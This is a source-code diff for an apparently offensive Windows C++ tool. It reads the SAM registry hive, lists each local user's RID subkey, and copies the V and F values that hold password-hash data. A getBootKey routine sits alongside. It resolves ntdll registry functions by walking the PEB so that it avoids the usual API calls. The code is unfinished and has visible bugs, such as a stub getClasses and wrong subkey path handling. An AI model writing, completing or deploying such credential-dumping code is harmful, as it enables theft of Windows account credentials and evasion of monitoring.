@@ -11,6 +11,7 @@
 #include <winternl.h>
 #include <BaseTsd.h>
 #include <ntstatus.h>
+#include <comdef.h>
 
 #include "Main.h"
 
@@ -21,6 +22,7 @@ myNtQueryKey pMyNtQueryKey;
 myNtEnumerateKey pMyNtEnumerateKey;
 myNtQueryValueKey pMyNtQueryValueKey;
 myNtEnumerateValueKey pMyNtEnumerateValueKey;
+myRtlInitUnicodeString pMyRtlInitUnicodeString;
 
 
 // Get Address from Export in module by walking PEB. Thus, not calling GetModuleHandle + GetProcAddress.
@@ -83,45 +85,113 @@ FARPROC myGetProcAddress(PCHAR moduleName, PCHAR exportName) {
 * NtEnumerateKey -> RegEnumerateKey, RegEnumerateKeyEx, RegEnumKey, RegEnumKeyEx
 * NtQueryValueKey -> RegQueryValue, RegQueryValueEx
 * NtEnumerateValueKey -> RegEnumValue
-* 
+*
 */
-void getSAM(PSAM* samRegEntries) {
+void getSAM(PSAM samRegEntries[], PULONG len) {
 	HANDLE key;
+	HANDLE subKey;
 	OBJECT_ATTRIBUTES attributes;
+	OBJECT_ATTRIBUTES attributesSubKey;
 	UNICODE_STRING UnicodeRegPath;
+	UNICODE_STRING UnicodeRegPathSubKey;
 	ULONG lengthBuff;
 	KEY_FULL_INFORMATION keyInfo;
 	KEY_FULL_INFORMATION keyInfoSubKeys;
+	KEY_BASIC_INFORMATION keyInfoSubKeysBasic;
+	KEY_VALUE_FULL_INFORMATION keyValuesSubKey;
 	WCHAR RegPath[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users";
-	DWORD maxLenOfNames; 
-	
+	DWORD maxLenOfNames;
+	ULONG nEntries = 0;
+	PSAM sams[MAX_SAM_ENTRIES];
+
 	DWORD ret;
 
-	RtlInitUnicodeString(&UnicodeRegPath, RegPath);
+	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
 	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 	ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
 
 	if (ret != STATUS_SUCCESS) {
-		exit(GetLastError());
+		exit(ret);
 	}
 
 	ret = pMyNtQueryKey(key, KeyFullInformation, &keyInfo, sizeof(keyInfo), &lengthBuff);
 
 	if (ret != STATUS_SUCCESS) {
-		exit(GetLastError());
+		exit(ret);
 	}
 
 	if (keyInfo.SubKeys) {
 		for (int i = 0; i < keyInfo.SubKeys; i++) {
 			maxLenOfNames = MAX_KEY_LENGTH;
-			ret = pMyNtEnumerateKey(key, i, KeyFullInformation, &keyInfoSubKeys, sizeof(keyInfoSubKeys), &lengthBuff);
+
+			ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, &keyInfoSubKeysBasic, sizeof(keyInfoSubKeysBasic), &lengthBuff);
 
 			if (ret != STATUS_SUCCESS) {
-				exit(GetLastError());
+				exit(ret);
+			}
+
+			_bstr_t aux(keyInfoSubKeysBasic.Name);
+
+			if (strncmp(aux, "00", strlen("00")) == 0) {
+				CHAR aux2[MAX_PATH];
+				strncat_s(aux2, MAX_PATH, aux, keyInfoSubKeysBasic.NameLength);
+
+				WCHAR RegPathSubKey[MAX_PATH];
+				size_t outSize;
+				mbstowcs_s(&outSize, RegPathSubKey, MAX_PATH, aux2, strlen(aux2 + 1));
+
+				pMyRtlInitUnicodeString(&UnicodeRegPathSubKey, RegPathSubKey);
+				InitializeObjectAttributes(&attributesSubKey, &UnicodeRegPathSubKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+				ret = pMyNtOpenKey(&subKey, KEY_READ, &attributesSubKey);
+
+				if (ret != STATUS_SUCCESS) {
+					exit(ret);
+				}
+
+				ret = pMyNtEnumerateKey(subKey, i, KeyFullInformation, &keyInfoSubKeys, sizeof(keyInfoSubKeys), &lengthBuff);
+
+				if (ret != STATUS_SUCCESS) {
+					exit(ret);
+				}
+
+				PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), NULL, sizeof(SAM));
+				CopyMemory(sam->rid, keyInfoSubKeysBasic.Name, keyInfoSubKeysBasic.NameLength);
+				getClasses(sam);
+				for (int j = 0; j < keyInfoSubKeys.Values; j++) {
+					ret = pMyNtEnumerateValueKey(subKey, j, KeyValueFullInformation, &keyValuesSubKey, sizeof(keyValuesSubKey), &lengthBuff);
+
+					if (ret != STATUS_SUCCESS) {
+						exit(ret);
+					}
+
+					_bstr_t aux(keyValuesSubKey.Name);
+					if (strncmp(aux, "V", keyValuesSubKey.NameLength) == 0) {
+						CopyMemory(sam->v, keyValuesSubKey.Name, keyValuesSubKey.NameLength);
+					}
+
+					if (strncmp(aux, "F", keyValuesSubKey.NameLength) == 0) {
+						CopyMemory(sam->f, keyValuesSubKey.Name, keyValuesSubKey.NameLength);
+					}
+				}
+				sams[nEntries] = sam;
+				nEntries++;
 			}
 		}
 	}
+
+	CopyMemory(len, &nEntries, sizeof(ULONG));
+	if (samRegEntries != NULL) {
+		for (int i = 0; i < nEntries; i++) {
+			CopyMemory(samRegEntries[i], sams[i], sizeof(SAM));
+		}
+	}
+}
+
+// TODO
+void getClasses(PSAM samRegEntry) {
+	return;
 }
 
 void getBootKey(PSAM samRegEntry, int* bootKeyRet) {
@@ -145,10 +215,13 @@ int main(int argc, char** argv) {
 	pMyNtEnumerateKey = (myNtEnumerateKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtEnumerateKey");
 	pMyNtQueryValueKey = (myNtQueryValueKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtQueryValueKey");
 	pMyNtEnumerateValueKey = (myNtEnumerateValueKey)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"NtEnumerateValueKey");
+	pMyRtlInitUnicodeString = (myRtlInitUnicodeString)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"RtlInitUnicodeString");
 
 	if (pMyMessageBox != NULL) {
 		pMyMessageBox(NULL, (LPCTSTR)"TEST", (LPCTSTR)"TEST", MB_OK);
 	}
 
-
+	// Time to debug as always works at first :D
+	ULONG len;
+	getSAM(NULL, &len);
 }
